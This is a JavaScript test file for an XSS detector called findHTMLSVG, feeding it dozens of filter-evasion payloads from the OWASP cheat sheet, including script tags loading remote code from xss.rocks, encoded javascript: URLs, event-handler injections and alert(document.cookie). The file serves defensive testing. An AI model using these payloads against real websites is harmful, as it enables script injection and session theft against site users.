import findHTMLSVG from '../index.js';
import assert from 'assert';

describe('Regex Matching', function() {
    /*
    *   Basic XSS Test Without Filter Evasion
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#basic-xss-test-without-filter-evasion
    */
    it('should match html script tags', function() {
        const testString = `<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   XSS Locator (Polyglot)
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-locator-polyglot
    */
    it('should match javascript, html attributes, and script tag', function() {
        const testString = `javascript:/*--></title></style></textarea></script></xmp>
        <svg/onload='+/"\`/+/onmouseover=1/+/[*/[]/+alert(42);//'>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 6);
    })

    /*
    *   Malformed A Tags
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#malformed-a-tags
    */
    it('should match a tags', function() {
        const testString = `\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Malformed IMG Tags
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#malformed-img-tags
    */
    it('should match img tags', function() {
        const testString = `<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   fromCharCode
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#fromcharcode
    */
    it('should match fromCharCode', function() {
        const testString = `<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Default SRC Tag to Get Past Filters that Check SRC Domain
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#default-src-tag-to-get-past-filters-that-check-src-domain
    */
    it('should match default src tag', function() {
        const testString = `<img SRC=# onmouseover="alert('xxs')"/>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   Default SRC Tag by Leaving it Empty
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#default-src-tag-by-leaving-it-empty
    */
    it('should match when src tag is empty', function() {
        const testString = `<img SRC= onmouseover="alert('xxs')"/>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   Default SRC Tag by Leaving it out Entirely
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#default-src-tag-by-leaving-it-out-entirely
    */
    it('should match when src tag is left out entirely', function() {
        const testString = `<img onmouseover="alert('xxs')"/>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   On Error Alert
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#on-error-alert
    */
    it('should match with onerror tags', function() {
        const testString = `<img SRC=/ onerror="alert(String.fromCharCode(88,83,83))"/>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   IMG onerror and JavaScript Alert Encode
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-onerror-and-javascript-alert-encode
    */
    it('should match with onerror with encoding', function() {
        const testString = `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"/>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   Decimal HTML Character References
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#decimal-html-character-references
    */
    it('should match with href with decimal html characters', function() {
        const testString = `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me</a>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Decimal HTML Character References Without Trailing Semicolons
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#decimal-html-character-references-without-trailing-semicolons
    */
    it('should match with decimal html character references without trailing semicolons', function() {
        const testString = `<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Hexadecimal HTML Character References Without Trailing Semicolons
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#hexadecimal-html-character-references-without-trailing-semicolons
    */
    it('should match with hexadecimal html character references without trailing semicolons', function() {
        const testString = `<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Embedded Tab
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-tab
    */
    it('should match with encoded tab', function() {
        const testString = `<a href="jav   ascript:alert('XSS');">Click Me</a>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Embedded Encoded Tab
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-encoded-tab
    */
    it('should match with embedded encoded tab', function() {
        const testString = `<a href="jav&#x09;ascript:alert('XSS');">Click Me</a>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Embedded Newline to Break Up XSS
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-newline-to-break-up-xss
    */
    it('should match with newline', function() {
        const testString1 = `<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>`;
        const result1 = findHTMLSVG(testString1);

        const testString2 = `perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out`;
        const result2 = findHTMLSVG(testString2);
        
        const testString3 = `<a href=" &#14;  javascript:alert('XSS');">Click Me</a>`;
        const result3 = findHTMLSVG(testString3);

        const testString4 = `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`;
        const result4 = findHTMLSVG(testString4);
        
        const testString5 = `<BODY onload!#$%&()*~+-_.,:;?@[/|\]^\`=alert("XSS")>`;
        const result5 = findHTMLSVG(testString5);

        const testString6 = `<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>`;
        const result6 = findHTMLSVG(testString6);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 1);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 2);

        assert.equal(result4[0], true);
        assert.equal(result4[1].length, 2);

        assert.equal(result5[0], true);
        assert.equal(result5[1].length, 1);

        assert.equal(result6[0], true);
        assert.equal(result6[1].length, 2);
    })

    /*
    *   Extraneous Open Brackets
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#extraneous-open-brackets
    */
    it('should match tags with extraneous open brackets', function() {
        const testString = `<<SCRIPT>alert("XSS");//\<</SCRIPT>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })
    
    /*
    *   No Closing Script Tags
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#no-closing-script-tags
    */
    it('should match non-closing script tags', function() {
        const testString = `<<SCRIPT>alert("XSS");//\<</SCRIPT>`;
        const result = findHTMLSVG(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Protocol Resolution in Script Tags
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#protocol-resolution-in-script-tags
    */
    it('should match protocol resolution bypass', function() {
        const testString = `<SCRIPT SRC=//xss.rocks/.j>`;
        const result = findHTMLSVG(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Half Open HTML/JavaScript XSS Vector
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#half-open-htmljavascript-xss-vector
    */
    it('should match half-open html', function() {
        const testString = `<IMG SRC="\`<javascript:alert>\`('XSS')"`;
        const result = findHTMLSVG(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Escaping JavaScript Escapes
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#escaping-javascript-escapes
    */
    it('should match javascript escapes', function() {
        const testString1 = `\";alert('XSS');//`;
        const testString2 = `</script><script>alert('XSS');</script>`;
        
        const result1 = findHTMLSVG(testString1);
        const result2 = findHTMLSVG(testString2);
        
        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);
    })

    /*
    *   End Title Tag
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#end-title-tag
    */
    it('should match end title tags', function() {
        const testString = `</TITLE><SCRIPT>alert("XSS");</SCRIPT>`;
        const result = findHTMLSVG(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   INPUT Image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#input-image
    */
    it('should match input image', function() {
        const testString = `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`;
        const result = findHTMLSVG(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   BODY Image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#body-image
    */
    it('should match input image', function() {
        const testString = `<BODY BACKGROUND="javascript:alert('XSS')">`;
        const result = findHTMLSVG(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   IMG Dynsrc
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-dynsrc
    */
    it('should match img dynsrc', function() {
        const testString = `<IMG DYNSRC="javascript:alert('XSS')">`;
        const result = findHTMLSVG(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   IMG Lowsrc
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-lowsrc
    */
    it('should match img lowsrc', function() {
        const testString = `<IMG LOWSRC="javascript:alert('XSS')">`;
        const result = findHTMLSVG(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   List-style-image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#list-style-image
    */
    it('should match embedding images for bulleted lists', function() {
        const testString = `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`;
        const result = findHTMLSVG(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   VBscript in an Image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#vbscript-in-an-image
    */
    it('should match vbscript in an image', function() {
        const testString = `<IMG SRC='vbscript:msgbox("XSS")'>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   VBscript in an Image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#vbscript-in-an-image
    */
    it('should match vbscript in an image', function() {
        const testString = `<IMG SRC='vbscript:msgbox("XSS")'>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   SVG Object Tag
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#svg-object-tag
    */
    it('should match svg object tag', function() {
        const testString = `<svg/onload=alert('XSS')>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   ECMAScript 6
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#ecmascript-6
    */
    it('should match svg object tag', function() {
        const testString = `Set.constructor\`alert\x28document.domain\x29`;
        const result = findHTMLSVG(testString);
   
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   BODY Tag
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#body-tag
    */
    it('should match body tag', function() {
        const testString = `<BODY ONLOAD=alert('XSS')>`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   BGSOUND
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#bgsound
    */
    it('should match bgsound tag', function() {
        const testString = `<BGSOUND SRC="javascript:alert('XSS');">`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   & JavaScript includes
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#javascript-includes
    */
    it('should match & JavaScript includes', function() {
        const testString = `<BR SIZE="&{alert('XSS')}">`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   STYLE sheet
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-sheet
    */
    it('should match style sheet', function() {
        const testString = `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`;
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Remote-style-sheet
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#remote-style-sheet
    */
    it('should match remote style sheet', function() {
        const testString1 = `<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">`;
        const testString2 = `<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`;
        const testString3 = `<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`;
        
        const result1 = findHTMLSVG(testString1);
        const result2 = findHTMLSVG(testString2);
        const result3 = findHTMLSVG(testString3);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 2);
    })

    /*
    *   STYLE Tags that Breaks Up JavaScript for XSS
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-tags-that-breaks-up-javascript-for-xss
    */
    it('should match style tags that break up JavaScript for XSS', function() {
        const testString = `<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   STYLE Attribute that Breaks Up an Expression
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-attribute-that-breaks-up-an-expression
    */
    it('should match style attributes that break up an expression', function() {
        const testString = `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   IMG STYLE with Expressions
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-style-with-expressions
    */
    it('should match img style with expressions', function() {
        const testString = `exp/*<A STYLE='no\\xss:noxss("*//*");
                            xss:ex/*XSS*//*/*/pression(alert("XSS"))'>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   STYLE Tag using Background-image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-tag-using-background-image
    */
    it('should match style tag using background-image', function() {
        const testString = `<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   STYLE Tag using Background
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-tag-using-background
    */
    it('should match style tag using background', function() {
        const testString1 = `<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`;
        const testString2 = `<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>`;

        const result1 = findHTMLSVG(testString1);
        const result2 = findHTMLSVG(testString2);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);
    })

    /*
    *   Anonymous HTML with STYLE Attribute
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#anonymous-html-with-style-attribute
    */
    it('should match anonymous html with style attribute', function() {
        const testString = `<XSS STYLE="xss:expression(alert('XSS'))">`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Local htc File
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#local-htc-file
    */
    it('should match local htc file', function() {
        const testString = `<XSS STYLE="behavior: url(xss.htc);">`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   US-ASCII Encoding
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#us-ascii-encoding
    */
    it('should match us-ascii encoding', function() {
        const testString = `¼script¾alert(¢XSS¢)¼/script¾`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   META
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#meta
    */
    it('should match meta tags', function() {
        const testString1 = `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`;
        const testString2 = `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`;
        const testString3 = `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`;

        const result1 = findHTMLSVG(testString1);
        const result2 = findHTMLSVG(testString2);
        const result3 = findHTMLSVG(testString3);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 2);
    })

    /*
    *   IFRAME
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#iframe
    */
    it('should match iframe', function() {
        const testString = `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   IFRAME Event Based
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#iframe-event-based
    */
    it('should match iframe event-based', function() {
        const testString = `<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   FRAME
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#frame
    */
    it('should match frame', function() {
        const testString = `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   TABLE
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#table
    */
    it('should match table elements', function() {
        const testString1 = `<TABLE BACKGROUND="javascript:alert('XSS')">`;
        const testString2 = `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`;

        const result1 = findHTMLSVG(testString1);
        const result2 = findHTMLSVG(testString2);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);
    })

    /*
    *   DIV
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#div
    */
    it('should match div tags', function() {
        const testString1 = `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`;
        const testString2 = `<DIV STYLE="background-image\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">`;
        const testString3 = `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`;
        const testString4 = `<DIV STYLE="width: expression(alert('XSS'));">`;

        const result1 = findHTMLSVG(testString1);
        const result2 = findHTMLSVG(testString2);
        const result3 = findHTMLSVG(testString3);
        const result4 = findHTMLSVG(testString4);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 2);

        assert.equal(result4[0], true);
        assert.equal(result4[1].length, 2);
    })

    /*
    *   Downlevel-Hidden Block
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#downlevel-hidden-block
    */
    it('should match downlevel-hidden block', function() {
        const testString = `<!--[if gte IE 4]>
                            <SCRIPT>alert('XSS');</SCRIPT>
                            <![endif]-->`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   BASE Tag
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#base-tag
    */
    it('should match base tag', function() {
        const testString = `<BASE HREF="javascript:alert('XSS');//">`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   OBJECT Tag
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#object-tag
    */
    it('should match object tag', function() {
        const testString = `<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   EMBED SVG Which Contains XSS Vector
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embed-svg-which-contains-xss-vector
    */
    it('should match EMBED SVG Which Contains XSS Vector', function() {
        const testString = `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   XML Data Island with CDATA Obfuscation
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xml-data-island-with-cdata-obfuscation
    */
    it('should match XML Data Island with CDATA Obfuscation', function() {
        const testString = `<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
                            <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Locally hosted XML with embedded JavaScript that is generated using an XML data island
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island
    */
    it('should match locally hosted XML with embedded JavaScript that is generated using an XML data island', function() {
        const testString = `<XML SRC="xsstest.xml" ID=I></XML>
                            <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   HTML+TIME in XML
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#htmltime-in-xml
    */
    it('should match HTML+TIME in XML', function() {
        const testString = `<HTML><BODY>
                            <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
                            <?import namespace="t" implementation="#default#time2">
                            <t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
                            </BODY></HTML>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Assuming you can only fit in a few characters and it filters against .js
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js
    */
    it('should match script tags with src attribute', function() {
        const testString = `<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   SSI (Server Side Includes)
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#ssi-server-side-includes
    */
    it('should match SSI', function() {
        const testString = `<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   PHP
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#php
    */
    it('should match PHP', function() {
        const testString = `<? echo('<SCR)';
                            echo('IPT>alert("XSS")</SCRIPT>'); ?>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   PHP
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#php
    */
    it('should match PHP', function() {
        const testString = `<? echo('<SCR)';
                            echo('IPT>alert("XSS")</SCRIPT>'); ?>`;
        
        const result = findHTMLSVG(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })
});
